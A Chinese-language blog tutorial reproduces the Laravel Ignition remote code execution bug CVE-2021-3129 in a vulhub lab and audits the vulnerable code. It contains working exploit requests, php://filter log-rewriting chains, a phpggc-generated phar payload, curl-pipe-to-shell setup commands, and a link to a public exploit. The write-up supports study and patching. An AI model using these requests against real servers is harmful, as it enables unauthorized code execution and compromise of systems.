## 搭建环境

使用国内的daocloud一键安装docker。

    
    
    curl -sSL <https://get.daocloud.io/docker> | sh
    

还要安装pip。

    
    
    curl -s <https://bootstrap.pypa.io/get-pip.py> | python3
    

完成安装pip之后,使用pip安装docker-compose。

    
    
    pip install docker-compose
    

安装完成后使用下面的命令测试是否安装成功。

    
    
    docker version
    docker-compose
    

使用vluhub上面的文件,找到CVE-2021-3129，根据github上面的教程下载对应环境文件。按照vulhub上面的教程来就可以。

https://github.com/vulhub/vulhub

本次复现的是Laravel框架的漏洞，进入对应路径。首先查看README文档，默认设置的Laravel开放在8080端口。本人用的是阿里云的ECS搭建的，所以要去阿里云控制台上的安全策略中设置开放8080端口接受流量。

## 复现过程

复现的过程在README中有很详细的指示。根据复现过程，首先需要向ignition组件发送数据包。其实Ignition就是laravel自己的Debug页面，原生PHP的报错显然不能满足要求，所以Ignition其实就是Laravel自己的提供了一大堆功能的报错页面。其中的Solution就非常的好用，可以让开发者点点鼠标修复一些bug。具体功能不用关心，只需要知道本次的漏洞入口在这里。

因为本次漏洞环境是用docker搭建的，所以在服务器端最好进入docker容器对应的挂载目录，方便查看网站日志被操作的过程。

![image](https://image.3001.net/images/20210527/1622077985_60aef221c45846e4aaedf.png!small)

    
    
    #找到需要进入目录的正在运行的容器的id
    docker ps -a
    #进入该容器的目录：
    docker exec -it 容器id /bin/bash
    #可以查看一下当前路径
    pwd 
    ls -al
    

首先为了验证漏洞存在,发送如下数据包

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: IP:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 168
    
    {
      "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "xxxxxxx"
      }
    }
    

如果返回了500并且出现了报错页面，从直接爆出的Debug页面中能看到这样的代码，证明漏洞存在。file_get_content作为php漏洞中经常见到的函数，这个函数支持php伪协议，会造成文件包含。

![image](https://image.3001.net/images/20210527/1622078037_60aef255dfd55cabfe77c.png!small)

发送如下数据包，将日志文件清空。

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: IP:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 330
    
    {
      "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
      }
    }
    

返回200表示清除成功。

![image](https://image.3001.net/images/20210527/1622078061_60aef26d623a76853412e.png!small)

使用phpggc生成序列化利用POC，没有安装phpggc的需要安装一下，phpggc是一款能够自动生成主流框架的序列化测试payload的工具。使用本条命令的时候要phpggc路径下。

    
    
    php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "%s" --phar phar -o php://output | base64 -w 0 | python3 -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
    

POC：

    
    
    =50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=6D=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=50=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=4B=00=43=00=64=00=33=00=61=00=47=00=39=00=68=00=62=00=57=00=6B=00=6E=00=4B=00=54=00=73=00=67=00=5A=00=58=00=68=00=70=00=64=00=44=00=73=00=67=00=50=00=7A=00=34=00=69=00=4F=00=33=00=31=00=39=00=66=00=51=00=55=00=41=00=41=00=41=00=42=00=6B=00=64=00=57=00=31=00=74=00=65=00=51=00=51=00=41=00=41=00=41=00=41=00=30=00=67=00=61=00=52=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=41=00=30=00=67=00=61=00=52=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=6B=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=30=00=5A=00=58=00=4E=00=30=00=4B=00=43=00=63=00=56=00=36=00=44=00=48=00=36=00=4F=00=39=00=6F=00=37=00=61=00=7A=00=48=00=6C=00=43=00=42=00=46=00=64=00=71=00=61=00=39=00=46=00=78=00=7A=00=4D=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a
    

接着发送如下数据包, 给log增加一个前缀 **AA** 来对齐。

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: IP:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 165
    
    {
      "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "AA"
      }
    }
    

![image](https://image.3001.net/images/20210527/1622078343_60aef387d58ace73b28bb.png!small)

下一步就将payload写入log文件中。

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: IP:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 5129
    
    {
      "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "Payload above" }
    }
    

![image](https://image.3001.net/images/20210527/1622078111_60aef29f1223dd234b669.png!small)

写入payload之后清除其他字符，解码payload。

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: IP:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 330
    
    {
      "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
      }
    }
    

最后触发反序列化，执行payload。

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: IP:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Connection: close
    Content-Type: application/json
    Content-Length: 210
    
    {
      "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"
      }
    }
    

![image](https://image.3001.net/images/20210527/1622078121_60aef2a9a18a06c1d806c.png!small)

## 漏洞原理

最最核心的原理还是反序列化，但是每一个反序列化都有着花里胡哨的入口。前几天做测试的时候发现低权限用户的操作被记录在日志中，可以被管理员审计。当时想着看能不能弹个框什么的，但是过滤做的挺好也没成功。这个漏洞给了不少思路，攻击者可以将几乎任意字符写在日志中，并且触发发序列化实现远程代码执行。

在这其中，涉及到了编码与解码，不同字符在这其中的处理方式给了利用本漏洞的机会。我用一道CTF题来举例子。

    
    
    <?PHP
    	#it is running under default installation of Ubuntu 18.04 + PHP7.2 + Apache.
    	($_=@$_GET['orange']) && @substr(file($_)[0], 0, 6) == '@<?php' ? include($_) : highlight_file(__FILE__);
    ?>
    

通过session.upload生成的session文件的开头为 **upload_progress_** ，并不符合题目要求。但是在PHP中，
**base64会自动忽略非法字符** 。给前缀拼接上ZZ成为 **upload_progress_ZZ**
，这个前缀在解码三次之后都会变成非法字符，导致前缀整个消失。基于这个特性就可以绕过限制，匹配**@<?php**。

![](https://image.3001.net/images/20210519/1621432815_60a519efa94d1a7586880.png!small)

同样把思路拽回到这个漏洞当中来，本来日志文件的格式是不符合命令执行格式的，通过编码解码的特点，将多余的字符消去剩下可执行格式，完成反序列化。

我们看一下报错响应，发送的json数据中的viewFile参数值被写入的log中。

![](https://image.3001.net/images/20210519/1621432876_60a51a2ca24feff2dfa58.png!small)

从服务器直接打开log文件，所有的绿色的部分为写入log文件的部分。

![image](https://image.3001.net/images/20210527/1622078269_60aef33d359c017191900.png!small)

接下来就是沿用CTF题目的思路往下，将log文件变成一个phar文件，配合phar伪协议执行反序列化。但是其中还有几个需要处理的问题。

首先上面说的base64在解码的时候会忽略掉非法字符，但是不会忽略的”=“。如果在使用base64解码的字符串中含有等于号，会造成报错返回空值。我们所注入的内容在日志中只占很小一部分，很难测试出一组合适的拼接字符，在特定次数的base64解码后让多余字符消失。

而且还有一个问题，日志前面的时间不可控，进行解码之后的内容也就不可控。

    
    
    php > var_dump(base64_decode(base64_decode('[2022-04-30 23:59:11]')));
    string(0) ""
    php > var_dump(base64_decode(base64_decode('[2022-04-12 23:59:11]')));
    string(1) "2"
    

还有，报错日志中包含了绝对路径，所以不能使用一个payload通杀，需要针对每一个目标生成一个新的payload。

还有还有，我们注入的payload会在日志中出现两次。

![image](https://image.3001.net/images/20210527/1622078282_60aef34a70db913f52946.png!small)

最终的日志格式应该是

> [prefix] **payload** [midfix] **payload** [suffix]

现在我们对log记录机制个格式有一个大致的了解，接下来就是解决这些困难的方法。首先上面提到应为不合法字符的存在，会导致base64解码跳过。利用这个机制，我们可以清空日志文件。

使用utf-16和utf-8两种编码相互转换，导致出错从而清空日志文件。并且因为日志中会出现两次payload，而UTF-16读取的是两个字节，可以在payload后面加一个字节，吞掉第二次出现的payload。注意这里有个小细节，当payload是奇数的时候第二个payload会正常解码，反之是第一个。

来回转换后除了payload以外的字符都不是base64解码的合法字符了，然后使用base64解码就可以只剩下payload存在。

但是这样我们相当于将一个字节的utf-8编码扩展为了两个字节的utf-16编码，默认使用了空字节来填充。但是在file_get_contents中使用空字节会报错。

    
    
    PHP Warning:  file_get_contents() expects parameter 1 to be a valid path, string given in php shell code on line 1
    

很幸运php提供给了我们解决方法。使用 **convert.quoted-printable-decode**
过滤器可以将空字符"\00"编码为”=00"写入log中，并且也有对应的解码器 **convert.quoted-printable-decode**
将其解码。

最终的编码/转码链如下。

    
    
    php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
    

最终梳理一下攻击链

> 1.利用UTF-8与UTF-16的相互转换加上base64解码，将日志清空。
>
> 2.给payload加上一个前缀AA，为了对齐两个比特。
>
> 3.将payload写入到log中。
>
> 4.重复第一步，清楚非payload部分，只留下遵守base64编码的payload。
>
> 5.使用phar伪协议触发反序列化实现命令执行。

## 代码审计

 **vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php**

    
    
    <?php
    
    namespace Facade\\Ignition\\Http\\Controllers;
    
    use Facade\\Ignition\\Http\\Requests\\ExecuteSolutionRequest;
    use Facade\\IgnitionContracts\\SolutionProviderRepository;
    use Illuminate\\Foundation\\Validation\\ValidatesRequests;
    
    class ExecuteSolutionController
    {
        use ValidatesRequests;
    
        public function __invoke(
            ExecuteSolutionRequest $request,
            SolutionProviderRepository $solutionProviderRepository
        ) {
            $solution = $request->getRunnableSolution();
    
            $solution->run($request->get('parameters', []));
    
            return response('');
        }
    }
    

solution调用了run方法，并传参parameters。这里就是传入点，并没做任何过滤。跟进solution方法的run函数。

 **vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php**

    
    
    public function run(array $parameters = [])
        {
            $output = $this->makeOptional($parameters);
            if ($output !== false) {
                file_put_contents($parameters['viewFile'], $output);
            }
        }
    
    public function makeOptional(array $parameters = [])
        {
            $originalContents = file_get_contents($parameters['viewFile']);
            $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);
    
            $originalTokens = token_get_all(Blade::compileString($originalContents));
            $newTokens = token_get_all(Blade::compileString($newContents));
    
            $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);
    
            if ($expectedTokens !== $newTokens) {
                return false;
            }
    
            return $newContents;
        }
    

参数传入了run函数之后也没有进行过滤，传入了makeOptional函数中。之后又被当作了file_get_contents的参数执行，被执行的参数为传入的json格式数据的viewFile参数，最终导致了反序列化漏洞的发生。

## 修复建议

请遵循官方文档，升级到安全版本。

## EXP

最后附上crisprss师傅的exp：https://github.com/crisprss/Laravel_CVE-2021-3129_EXP  
请大家自行搭建环境进行测试，不要做未授权测试。

